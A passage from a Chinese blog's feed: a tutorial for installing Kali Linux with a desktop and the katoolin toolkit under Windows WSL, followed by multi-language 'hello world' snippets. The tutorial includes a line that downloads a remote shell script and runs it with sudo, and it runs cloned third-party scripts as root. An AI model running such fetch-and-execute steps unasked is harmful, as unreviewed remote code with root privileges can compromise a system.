alt="img"></p><p>安装</p><p>安装完成后设置用户名为kali，设置密码</p><p>至此命令行kali安装完成</p><h2 id="安装图形化界面"><a href="#安装图形化界面" class="headerlink" title="安装图形化界面"></a>安装图形化界面</h2><p>安装vim</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>更换kali源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加下边的两个源：</p><p>#中科大</p><blockquote><p>deb <a href="https://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib </p><p>deb-src <a href="https://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p></blockquote><p>保存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update <span class="comment">#更新源 </span></span><br><span class="line"></span><br><span class="line">wget https://kali.sh/xfce4.sh sudo sh xfce4.sh <span class="comment">#安装桌面环境 </span></span><br><span class="line"></span><br><span class="line">sudo /etc/init.d/xrdp start <span class="comment">#开启桌面</span></span><br></pre></td></tr></table></figure><p>#这时候可以使用 windows 的远程桌面连接，输入 127.0.0.1：3390</p><p>#当不想使用桌面环境时，点击 logout 后在命令行执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/xrdp stop</span><br></pre></td></tr></table></figure><h2 id="安装kali-工具"><a href="#安装kali-工具" class="headerlink" title="安装kali 工具"></a>安装kali 工具</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装python</span></span><br><span class="line">sudo apt-get install python</span><br><span class="line"><span class="comment">#安装gnupg</span></span><br><span class="line">sudo apt-get install gnupg</span><br><span class="line"><span class="comment">#安装git</span></span><br><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p>下载工具包脚本，并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/LionSec/katoolin.git &amp;&amp; sudo cp katoolin/katoolin.py /usr/bin/katoolin </span><br><span class="line"></span><br><span class="line">chmod +x /usr/bin/katoolin </span><br><span class="line"></span><br><span class="line">sudo katoolin</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行(1-&gt;1-&gt;2) -&gt; back -&gt; (2-&gt;0)</span></span><br></pre></td></tr></table></figure><p>即可安装工具成功</p><p>注: 有可能出现安装不成功类似于图示错误</p><p><img src="https://i.loli.net/2021/01/07/DrmB2uhgR38bGWa.png" alt="img"></p><p>由于某些工具不存在源或其他原因不能一次全部安装，需要修改/usr/bin/katoolin 中源代码，将不存在的工具删除</p><p>下面是我更改好的源代码地址</p><blockquote><p><a href="https://github.com/Gr3enh4nd/katoolin.git" target="_blank" rel="noopener">https://github.com/Gr3enh4nd/katoolin.git</a></p></blockquote><p>至此工具安装完成</p><p>我们打开一个msf</p><h2 id="注"><a href="#注" class="headerlink" title="注"></a><strong>注</strong></h2><h3 id="安装kali工具另一种方法："><a href="#安装kali工具另一种方法：" class="headerlink" title="安装kali工具另一种方法："></a><strong>安装kali工具另一种方法：</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install kali-linux-full</span><br></pre></td></tr></table></figure><h3 id="更改默认用户为root："><a href="#更改默认用户为root：" class="headerlink" title="更改默认用户为root："></a><strong>更改默认用户为root：</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali config --default-user root </span><br><span class="line"></span><br><span class="line">//WSL 子系统是基于 LxssManager 服务运行的，在更改过默认用户后，我们需要重启该服务，使改动生效 </span><br><span class="line"></span><br><span class="line">net stop LxssManager </span><br><span class="line"></span><br><span class="line">net start LxssManager</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;打开windows开发人员模式&quot;&gt;&lt;a href=&quot;#打开windows开发人员模式&quot; class=&quot;headerlink&quot; title=&quot;打开windows开发人员模式&quot;&gt;&lt;/a&gt;打开windows开发人员模式&lt;/h2&gt;
    
    </summary>
    
    
      <category term="kali" scheme="http://goudanjun.vip/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>hello world</title>
    <link href="http://goudanjun.vip/2019/07/24/hello-world.html/"/>
    <id>http://goudanjun.vip/2019/07/24/hello-world.html/</id>
    <published>2019-07-24T12:27:22.000Z</published>
    <updated>2021-01-07T15:02:44.998Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Bat命令"><a href="#Bat命令" class="headerlink" title="Bat命令"></a>Bat命令</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> Hello, world!</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"Hello, World!"</span>)</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello, World!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"Hello,world!"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        System.out.println( <span class="string">"Hello, World!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello, World!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-2"><a href="#C-2" class="headerlink" title="C"></a>C</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">namespace HelloWorld</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">   &#123;</span><br><span class="line">            System.Console.Write(&quot;Hello, World!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello, world!'</span>;  </span><br><span class="line"><span class="keyword">print</span> <span class="string">'Hello, world!'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.write (&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert (<span class="string">"Hello, World!"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">``</span><span class="string">"Hello, World!"</span><span class="string">``</span>);</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Hello, World!"</span>)</span><br></pre></td></tr></table></figure><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Bat命令&quot;&gt;&lt;a href=&quot;#Bat命令&quot; class=&quot;headerlink&quot; title=&quot;Bat命令&quot;&gt;&lt;/a&gt;Bat命令&lt;/h3&gt;&lt;figure class=&quot;highlight bat&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; Hello, world!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;pause&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
